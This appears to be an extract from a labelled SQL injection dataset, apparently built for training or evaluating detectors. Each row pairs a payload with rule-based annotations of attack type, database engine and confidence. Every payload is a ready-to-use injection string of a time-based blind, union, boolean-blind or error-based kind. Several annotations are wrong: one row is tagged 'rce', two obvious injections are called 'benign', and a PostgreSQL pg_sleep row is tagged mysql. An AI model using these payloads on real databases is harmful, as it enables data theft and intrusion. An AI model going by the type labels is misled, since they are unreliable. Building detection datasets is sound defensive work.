row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8190,"1'+ ( select dagm where 5461 = 5461 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
8191,-3938%' ) ) ) or 2034 = 7209#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8192,1 ) as jmib where 8130 = 8130 rlike ( select ( case when ( 7885 = 3932 ) then 1 else 0x28 end ) ) --,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
8193,"1"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ""xmrq"" = ""xmrq",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8194,"1%"" rlike sleep ( 5 ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8195,1 waitfor delay '0:0:5',1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8196,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8197,"1%' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8198,"1%"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""%"" = """,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
8199,"1"" ) where 1700 = 1700 union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8200,"-4480' ) where 4661 = 4661 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
8201,1' ) ) waitfor delay '0:0:5' and ( ( 'bbqk' = 'bbqk,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
